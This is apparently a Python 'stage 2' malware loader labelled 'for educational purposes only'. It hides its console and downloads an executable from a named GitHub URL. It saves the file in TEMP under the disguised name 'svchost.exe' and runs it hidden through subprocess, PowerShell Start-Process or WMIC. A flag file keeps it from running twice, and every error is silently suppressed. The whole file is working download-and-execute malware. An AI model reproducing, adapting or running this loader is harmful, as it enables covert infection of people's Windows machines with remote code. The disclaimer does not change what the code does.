# ============================================================
#   PYTHON PAYLOAD LOADER (Stage 2)
#   For Educational Purposes Only
# ============================================================

import os
import sys
import time
import subprocess
import urllib.request
import ssl
import ctypes
from pathlib import Path

# ============================================================
#  CONFIGURATION
# ============================================================

PAYLOAD_URL = "https://github.com/e34821704-max/usdtrsv/raw/refs/heads/main/Skype_Business.exe"
PAYLOAD_PATH = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'svchost.exe')
FLAG_FILE = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'stage2_complete.flag')

# ============================================================
#  HELPER FUNCTIONS
# ============================================================

def hide_console():
    """Hide the console window"""
    try:
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)
    except:
        pass

def download_payload():
    """Download the payload"""
    try:
        # Bypass SSL verification
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        urllib.request.urlretrieve(PAYLOAD_URL, PAYLOAD_PATH)
        
        if os.path.exists(PAYLOAD_PATH) and os.path.getsize(PAYLOAD_PATH) > 0:
            return True
    except:
        pass
    return False

def execute_payload():
    """Execute the payload using multiple methods"""
    
    if not os.path.exists(PAYLOAD_PATH):
        return False
    
    # Method 1: Direct execution (hidden)
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags = subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0
        subprocess.Popen([PAYLOAD_PATH], 
                        startupinfo=startupinfo,
                        shell=True,
                        creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        pass
    
    # Method 2: PowerShell Start-Process
    try:
        subprocess.Popen(['powershell', '-Command', 
                         f'Start-Process -FilePath "{PAYLOAD_PATH}" -WindowStyle Hidden'],
                        creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        pass
    
    # Method 3: WMI
    try:
        subprocess.Popen(['wmic', 'process', 'call', 'create', PAYLOAD_PATH],
                        creationflags=subprocess.CREATE_NO_WINDOW)
        return True
    except:
        pass
    
    return False

def main():
    """Main execution"""
    
    # Check if already executed
    if os.path.exists(FLAG_FILE):
        return
    
    # Hide console
    hide_console()
    
    # Small delay
    time.sleep(5)
    
    # Download payload
    if download_payload():
        # Create flag file
        try:
            with open(FLAG_FILE, 'w') as f:
                f.write(f"Stage 2 completed: {time.ctime()}")
        except:
            pass
        
        # Execute payload
        execute_payload()

if __name__ == "__main__":
    try:
        main()
    except:
        pass
    finally:
        sys.exit(0)
